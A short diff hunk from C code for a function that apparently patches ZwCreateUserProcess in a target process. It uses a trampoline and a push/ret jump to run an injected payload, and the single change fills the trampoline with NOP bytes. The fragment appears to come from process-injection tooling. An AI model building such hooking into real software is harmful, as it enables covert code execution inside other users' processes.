@@ -169,7 +169,7 @@ void CreateProcessPatch(DWORD pid)
         DWORD* jmp_dest = (DWORD*)&pushret_relative_ref[2];
         LPVOID payload = NULL;
         unsigned char* zwcreateuserprocess_next_valid_instruction = NULL;
-        unsigned char trampoline[40] = { 0 };
+        unsigned char trampoline[40] = { 0x90 };
         unsigned char* trampoline_ptr = NULL;
         DWORD payload_size = get_payload_size();
         void* payload_ep = get_payload_ep();
